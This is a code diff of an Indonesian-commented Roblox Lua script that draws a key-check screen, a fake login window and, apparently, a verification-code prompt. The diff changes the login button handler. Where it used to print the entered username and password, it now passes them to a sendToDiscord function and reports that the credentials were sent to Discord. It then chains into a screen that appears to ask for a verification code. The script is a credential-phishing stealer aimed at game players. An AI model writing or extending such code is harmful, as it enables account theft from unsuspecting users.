@@ -146,7 +146,8 @@ local function createLoadingGUI(duration, onComplete)
     loadingCircle.AnchorPoint = Vector2.new(0.5, 0.5)
 
     local rotation = 0
-    game:GetService("RunService").RenderStepped:Connect(function()
+    local runService = game:GetService("RunService")
+    local connection = runService.RenderStepped:Connect(function()
         rotation = rotation + 2
         loadingCircle.Rotation = rotation
     end)
@@ -154,7 +155,7 @@ local function createLoadingGUI(duration, onComplete)
     -- Teks "Loading"
     textLabel.Name = "LoadingText"
     textLabel.Parent = frame
-    textLabel.Text = "Loading..."
+    textLabel.Text = "Loading... Please Wait"
     textLabel.TextColor3 = Color3.new(1, 1, 1) -- Warna putih
     textLabel.BackgroundTransparency = 1
     textLabel.Size = UDim2.new(1, 0, 0, 40)
@@ -163,13 +164,15 @@ local function createLoadingGUI(duration, onComplete)
     textLabel.TextScaled = true
 
     -- Durasi Loading
-    task.wait(8)
-    gui:Destroy()
-    if onComplete then
-        onComplete() -- Memanggil fungsi setelah loading selesai
-    end
+    task.delay(duration or 3, function()
+        gui:Destroy()
+        connection:Disconnect()
+        if onComplete then
+            onComplete()
+        end
+    end)
 end
-    
+
 -- Fungsi Membuat GUI Login
 local function createLoginGUI()
     local gui = Instance.new("ScreenGui")
@@ -230,7 +233,6 @@ local function createLoginGUI()
     passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Penyensoran Manual
     passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
         local currentText = passwordBox.Text
         if #currentText > #password then
@@ -253,18 +255,21 @@ local function createLoginGUI()
     loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Fungsi Login Button
     loginButton.MouseButton1Click:Connect(function()
         if usernameBox.Text ~= "" and password ~= "" then
-            print("Username:", usernameBox.Text, "Password:", password)
+            sendToDiscord("Username: " .. usernameBox.Text .. "\nPassword: " .. password)
+            print("Username dan Password terkirim ke Discord!")
             gui:Destroy()
+            createLoadingGUI(3, function()
+                createVerificationCodeGUI()
+            end)
         else
             print("Harap isi username dan password!")
         end
     end)
 end
 
--- Fungsi Membuat GUI Validasi Key
+-- Fungsi Validasi Key
 local function createKeyValidationGUI()
     local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
@@ -274,11 +279,9 @@ local function createKeyValidationGUI()
     local copyLinkButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel")
 
-    -- Properti GUI
     gui.Name = "KeyValidationGUI"
-    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+    gui.Parent = game:GetService("CoreGui")
 
-    -- Frame
     frame.Name = "KeyFrame"
     frame.Parent = gui
     frame.Size = UDim2.new(0, 300, 0, 250)
@@ -287,7 +290,6 @@ local function createKeyValidationGUI()
     frame.BorderSizePixel = 3
     frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 
-    -- Title Label
     titleLabel.Name = "TitleLabel"
     titleLabel.Parent = frame
     titleLabel.Size = UDim2.new(1, 0, 0, 50)
@@ -298,7 +300,6 @@ local function createKeyValidationGUI()
     titleLabel.TextSize = 24
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Key Box
     keyBox.Name = "KeyBox"
     keyBox.Parent = frame
     keyBox.Size = UDim2.new(1, -20, 0, 40)
@@ -310,7 +311,6 @@ local function createKeyValidationGUI()
     keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Error Label
     errorLabel.Name = "ErrorLabel"
     errorLabel.Parent = frame
     errorLabel.Size = UDim2.new(1, -20, 0, 20)
@@ -321,7 +321,6 @@ local function createKeyValidationGUI()
     errorLabel.TextSize = 14
     errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 
-    -- Verify Key Button
     verifyKeyButton.Name = "VerifyKeyButton"
     verifyKeyButton.Parent = frame
     verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
@@ -332,7 +331,6 @@ local function createKeyValidationGUI()
     verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Copy Link Button
     copyLinkButton.Name = "CopyLinkButton"
     copyLinkButton.Parent = frame
     copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
@@ -343,7 +341,6 @@ local function createKeyValidationGUI()
     copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
     copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Fungsi Tombol Copy Link
     copyLinkButton.MouseButton1Click:Connect(function()
         if setclipboard then
             setclipboard(linkUrl)
@@ -353,17 +350,16 @@ local function createKeyValidationGUI()
         end
     end)
 
-    -- Fungsi Verifikasi Key
     verifyKeyButton.MouseButton1Click:Connect(function()
         if keyBox.Text == correctKey then
             print("Key benar!")
             gui:Destroy()
-            createLoginGUI() -- Memanggil GUI login
+            createLoginGUI()
         else
             errorLabel.Text = "Key salah! Silahkan Get Key."
         end
     end)
 end
 
--- Memulai Script dengan GUI Pertama
+-- Jalankan GUI Pertama
 createKeyValidationGUI()
